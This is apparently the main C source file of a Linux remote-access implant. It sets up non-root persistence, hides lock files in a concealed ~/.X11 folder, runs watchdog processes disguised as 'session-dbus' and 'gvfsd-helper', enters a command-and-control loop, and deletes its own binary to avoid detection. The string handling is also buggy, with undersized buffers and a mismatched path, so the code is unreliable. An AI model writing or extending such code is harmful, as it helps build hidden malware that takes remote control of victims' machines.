#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
// custom functions
#include "utils.h"
#include "persistence.h"

int main(int argc, char *argv[]) {

    #ifdef DEBUG
    printf("DEBUG MODE ENABLED\n");
    #endif


    bool desktop_res = nonroot_persistence();
    if (desktop_res == false ) {
        fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
        exit(1);
    }
    //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
    char *home = getenv("HOME");
    char *lock_path = "/.X11/.X11-lock";
    char *lock_path_2 = "/.X11/.X0-lock";
    char *home_lock_path = (char *)malloc(strlen(home) + strlen(lock_path));
    char *home_lock_path_2 = (char *)malloc(strlen(home) + strlen(lock_path_2));

    memcpy(home_lock_path, home, strlen(home));
    memcpy(home_lock_path_2, home, strlen(home));

    strncat(home_lock_path, lock_path, strlen(lock_path));
    strncat(home_lock_path_2, lock_path, strlen(lock_path_2));

    //ex: lock_check("/home/gdev/.X11/.X11-lock")
    if (lock_check(home_lock_path) != 0) {

        create_lock(0);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
        spawn_thread_watchdog(0);

        do {
            // forever run session-dbus as a "watchdog process".
            sleep(10);
        }while(true);

    }
        //daemon(0, 0);  // detach from current console
        // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper

     // creating .X11/X0-lock
    create_lock(1);
        //session-dbus create
    spawn_thread_watchdog(1);
        // Main C2 goes here?
    c2_loop();

    #ifndef DEBUG
    self_delete(argv[0]); //  deleting this binary.
    #endif
    return 0;
 }
